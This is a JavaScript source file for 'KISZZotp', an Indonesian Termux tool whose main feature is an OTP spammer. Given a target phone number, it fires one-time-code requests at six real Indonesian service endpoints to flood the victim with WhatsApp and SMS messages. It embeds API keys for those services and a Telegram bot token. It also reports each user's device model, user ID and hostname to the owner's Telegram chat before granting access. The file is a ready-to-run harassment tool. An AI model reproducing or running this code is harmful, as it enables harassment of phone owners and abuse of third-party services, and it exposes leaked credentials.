import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const C = {
    TOKEN: '8732611588:AAHwd7IcRI0lPWpPNuzHSedfEm8VhhySG5A',
    CHAT_ID: '8276813899',
    VER: '1.0.0',
    TIMEOUT: 60,
    POLL: 2,
};

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function getID() {
    try { return `${execSync('id -u').toString().trim()}@${os.hostname()}`; } catch { return 'unknown'; }
}
function getDevice() {
    try {
        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${m} (Android ${a})`;
    } catch { return 'Unknown'; }
}
function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
function genCode() { return crypto.randomInt(100000, 999999).toString(); }

async function sendTG(text, kb = null) {
    try {
        const p = { chat_id: C.CHAT_ID, text, parse_mode: 'Markdown' };
        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
        await axios.post(`https://api.telegram.org/bot${C.TOKEN}/sendMessage`, p);
        return true;
    } catch { return false; }
}
async function ansCB(id, text) {
    try { await axios.post(`https://api.telegram.org/bot${C.TOKEN}/answerCallbackQuery`, { callback_query_id: id, text, show_alert: false }); } catch {}
}
async function getUpd(off) {
    try { const r = await axios.get(`https://api.telegram.org/bot${C.TOKEN}/getUpdates`, { params: { offset: off, timeout: 10 } }); return r.data.result || []; } catch { return []; }
}

function isApp(id) {
    try { if (!fs.existsSync('approved.json')) return false; return JSON.parse(fs.readFileSync('approved.json')).includes(id); } catch { return false; }
}
function saveApp(id) {
    try { let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); } return true; } catch { return false; }
}

async function reqApp(user, id, dev) {
    const code = genCode();
    const kb = [[{ text: '✅ Approve', callback_data: `app_${code}` }, { text: '❌ Deny', callback_data: `den_${code}` }]];
    const msg = `🔐 *Request Approval*\n👤 ${user}\n🆔 ${id}\n📱 ${dev}\n🔑 *${code}*`;
    console.log(chalk.yellow('\n⏳ Mengirim request...'));
    if (!await sendTG(msg, kb)) { console.log(chalk.red('❌ Gagal kirim ke TG.')); process.exit(1); }
    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
    let off = 0;
    try { const old = await getUpd(0); if (old.length > 0) off = old[old.length - 1].update_id + 1; } catch {}
    const start = Date.now();
    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
        try {
            const up = await getUpd(off);
            for (const u of up) {
                off = u.update_id + 1;
                if (u.callback_query) {
                    const d = u.callback_query.data;
                    const from = u.callback_query.from.id;
                    const cid = u.callback_query.id;
                    if (from == C.CHAT_ID) {
                        if (d === `app_${code}`) { await ansCB(cid, '✅ Disetujui!'); console.log(chalk.green('\n✅ APPROVED!')); saveApp(id); return true; }
                        if (d === `den_${code}`) { await ansCB(cid, '❌ Ditolak.'); console.log(chalk.red('\n❌ DENIED!')); return false; }
                    } else { await ansCB(cid, '❌ Bukan owner!'); }
                }
            }
        } catch {}
        await sleep(C.POLL * 1000);
    }
    console.log(chalk.red('\n⏰ Waktu habis!'));
    return false;
}

function getUser() {
    let n = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    return n.trim() || 'Anonymous';
}

function getStat(isO) { return isO ? chalk.green('★ OWNER') : chalk.yellow('▸ Gratisan'); }

function showHead(u, s, id, dev) {
    console.clear();
    console.log(chalk.cyan(`\n╔═══════════════════════════════════╗\n║   KISZZotp v${C.VER}               ║\n╠═══════════════════════════════════╣\n║ 👤 User  : ${chalk.green(u)}\n║ 📊 Status: ${s}\n║ 🆔 ID    : ${chalk.blue(id)}\n║ 📱 Device: ${chalk.magenta(dev)}\n║ ⏰ Waktu : ${chalk.gray(getTime())}\n╚═══════════════════════════════════╝\n`));
}

function showMenu() {
    console.log(chalk.yellow(`\n📋 MENU UTAMA`));
    console.log(chalk.yellow(`─`.repeat(30)));
    console.log(chalk.cyan(`1.`) + ` 🚀 Spammer OTP`);
    console.log(chalk.cyan(`2.`) + ` ❌ Keluar`);
    console.log(chalk.yellow(`─`.repeat(30)));
}

async function spam(user, id) {
    console.clear();
    console.log(chalk.cyan(`\n🚀 SPAMMER OTP\n`));
    const inp = readlineSync.question(chalk.white('📱 Nomor target: '));
    if (!inp.trim()) return console.log(chalk.red('❌ Tidak boleh kosong!'));
    let phone = inp.replace(/[^0-9]/g, "");
    if (phone.startsWith("0")) phone = "62" + phone.slice(1);
    if (!phone.startsWith("62")) phone = "62" + phone;
    const p08 = "0" + phone.slice(2);
    const p62 = phone;
    console.log(chalk.green(`✅ Target: ${phone}\n`));
    const otp = [
        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
        { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
        { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
        { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
        { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
    ];
    let s = 0, f = 0;
    for (let i = 0; i < otp.length; i++) {
        const ep = otp[i];
        try {
            const cfg = { headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) }, timeout: 10000 };
            process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
            if (ep.method === "GET") await axios.get(ep.url, cfg);
            else await axios.post(ep.url, ep.data, cfg);
            s++; console.log(chalk.green('✅ Berhasil'));
        } catch { f++; console.log(chalk.red('❌ Gagal')); }
        await sleep(1000);
    }
    console.log(`\n📱 ${phone}\n📤 ${otp.length}\n✅ ${s}\n❌ ${f}`);
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function main() {
    console.clear();
    console.log(chalk.cyan(`\n╔═══════════════════════════════════════════════╗\n║     SELAMAT DATANG DI KISZZotp               ║\n╚═══════════════════════════════════════════════╝\n`));
    await sleep(1000);
    const userName = getUser();
    const termuxId = getID();
    const device = getDevice();
    const isOwner = userName.toLowerCase() === 'kiszzaja';

    if (!isOwner) {
        if (!isApp(termuxId)) {
            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
            if (!await reqApp(userName, termuxId, device)) {
                console.log(chalk.red('❌ Akses ditolak.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Sudah terdaftar!'));
            await sleep(1000);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode!'));
        await sleep(1000);
    }

    while (true) {
        const status = getStat(isOwner);
        showHead(userName, status, termuxId, device);
        showMenu();
        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-2]: '));
        if (choice === '1') await spam(userName, termuxId);
        else if (choice === '2') {
            console.log(chalk.green('\n👋 Sampai jumpa!'));
            process.exit(0);
        } else {
            console.log(chalk.red('❌ Salah!'));
            await sleep(1000);
        }
    }
}

main().catch(err => console.error(chalk.red('❌ Error:', err.message)));
